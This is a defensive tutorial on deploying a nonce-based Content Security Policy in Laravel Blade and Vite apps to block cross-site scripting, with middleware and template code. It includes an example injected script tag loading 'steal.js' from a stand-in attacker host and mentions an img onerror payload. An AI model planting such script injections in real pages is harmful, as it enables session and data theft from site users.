# Modern Content Security Policy (CSP): Protect Laravel Blade and SPAs from XSS

An attacker injects a malicious `<script>` tag into a public comment field or third-party analytics script. Because your application lacks a Content Security Policy (CSP), the victim's browser executes the script immediately, harvesting session tokens, intercepting credit card keystrokes, and exfiltrating private customer data to a remote command-and-control server.

Output escaping in Blade helps prevent basic Cross-Site Scripting (XSS), but it cannot protect you from compromised third-party npm dependencies, malicious CDN scripts, or HTML injection in rich-text inputs. A Content Security Policy (CSP) acts as the browser's final, authoritative defense layer. By generating cryptographic nonces per request and enforcing strict source directives, you can block unauthorized scripts from executing even if an attacker successfully injects HTML into your DOM.

## Why HTML Escaping Alone Is Not Enough

Blade's `{{ $content }}` syntax automatically runs PHP's `htmlspecialchars()` to escape angle brackets and quotes.

However, modern web applications contain numerous scenarios where raw unescaped markup is required:
- Rich-text editors (like CKEditor, Quill, or Trix) storing trusted customer HTML via `{!! $post->body !!}`.
- Marketing analytics and conversion pixels loaded from third-party tag managers.
- Browser extensions or compromised third-party npm dependencies injecting DOM nodes dynamically.

If an attacker sneaks a `<script>` or `<img onerror=...>` payload past your HTML sanitizer, the victim's browser will execute it with full access to cookies, local storage, and authenticated session endpoints.

## How a Nonce-Based CSP Works

A Content Security Policy is delivered as an HTTP response header that instructs the browser which origins and scripts are allowed to execute:

```
Content-Security-Policy: script-src 'nonce-RANDOM_BASE64_TOKEN' 'strict-dynamic';
```

When this header is present, the browser applies an absolute rule: **No script executes unless it carries an identical `nonce` attribute matching the header of that specific HTTP response.**

Even if an attacker injects `<script src="https://evil.com/steal.js"></script>`, the browser rejects it because the script lacks the secret, single-use nonce token generated on the server.

## Step 1: Generate a Cryptographic Nonce per Request

Create a middleware that generates a cryptographically secure, random 128-bit nonce for each incoming HTTP request:

app/Http/Middleware/ContentSecurityPolicyMiddleware.php:
```php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class ContentSecurityPolicyMiddleware
{
    public function handle(Request $request, Closure $next): Response
    {
        // 1. Generate a fresh, unpredictable nonce for this request
        $nonce = base64_encode(random_bytes(16));

        // 2. Share the nonce globally with Blade templates and Vite
        app()->instance('csp-nonce', $nonce);
        view()->share('cspNonce', $nonce);

        /** @var Response $response */
        $response = $next($request);

        // 3. Assemble the Content Security Policy directives
        $cspHeader = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$nonce}' 'strict-dynamic' https:",
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
            "font-src 'self' https://fonts.gstatic.com data:",
            "img-src 'self' data: https:",
            "connect-src 'self' https://api.stripe.com",
            "frame-src 'self' https://js.stripe.com",
            "object-src 'none'",
            "base-uri 'self'",
        ]);

        $response->headers->set('Content-Security-Policy', $cspHeader);

        return $response;
    }
}
```

Register this middleware in your `web` middleware group.

## Step 2: Bind Nonces in Blade Templates and Vite

When rendering inline scripts or script tags in Blade views, attach the generated `$cspNonce`:

resources/views/layouts/app.blade.php:
```blade
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>{{ config('app.name') }}</title>

    <!-- Pass nonce to Laravel Vite directives -->
    @vite(['resources/css/app.css', 'resources/js/app.js'], nonce: $cspNonce)
</head>
<body>
    @yield('content')

    <!-- Any necessary inline scripts MUST carry the nonce -->
    <script nonce="{{ $cspNonce }}">
        window.AppData = {
            userId: {{ auth()->id() ?? 'null' }},
            environment: "{{ app()->environment() }}"
        };
    </script>
</body>
</html>
```

Laravel's `@vite` directive natively accepts a `nonce:` parameter, automatically injecting the `nonce` attribute onto all compiled script and link tags.

## Step 3: Use Report-Only Mode During Initial Rollout

Rolling out a strict CSP on an existing, mature application can inadvertently break legitimate third-party widgets (like Stripe, Google Maps, or Intercom) if their domains are omitted from your directives.

Use `Content-Security-Policy-Report-Only` during your rollout phase:

```php
// Report-Only: Browser logs violations without blocking scripts
$response->headers->set('Content-Security-Policy-Report-Only', $cspHeader . '; report-uri /api/csp-violations');
```

The browser continues executing all scripts, but sends a JSON payload to your `/api/csp-violations` endpoint whenever a script violates your policy. Monitor this log for one week to identify legitimate third-party domains before switching to enforcement mode.

## What Can Go Wrong

The most frequent mistake when implementing CSP is adding `'unsafe-inline'` to `script-src` to fix broken inline event handlers:

```php
// Dangerous: 'unsafe-inline' completely neutralizes script protection!
"script-src 'self' 'unsafe-inline'"
```

If `'unsafe-inline'` is present without a nonce, the browser allows any inline `<script>` tag to execute, completely destroying your defense against XSS.

Never use `'unsafe-inline'` for scripts. Instead, use nonces or refactor inline `onclick="..."` handlers into external JavaScript event listeners.

## Summary

Do not rely solely on HTML escaping to protect your users from Cross-Site Scripting.

Deploy a strict Content Security Policy. Generate a cryptographic nonce per request, bind it to your Blade views and Vite tags, and prohibit un-nonced inline scripts and object embeds.

Your users remain protected from stolen sessions and data exfiltration even if an attacker successfully injects HTML markup into your database.

## Further Reading

- [MDN Web Docs: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google Web Fundamentals: Strict Content Security Policy](https://web.dev/articles/strict-csp)
- [Laravel Documentation: Compiling Assets with Vite (Nonces)](https://laravel.com/docs/vite#content-security-policy-csp-nonce)
- [Spatie Laravel CSP Package](https://github.com/spatie/laravel-csp)

How do you manage third-party analytics and chat widgets within your application's CSP? Share your configuration tips in the comments below.
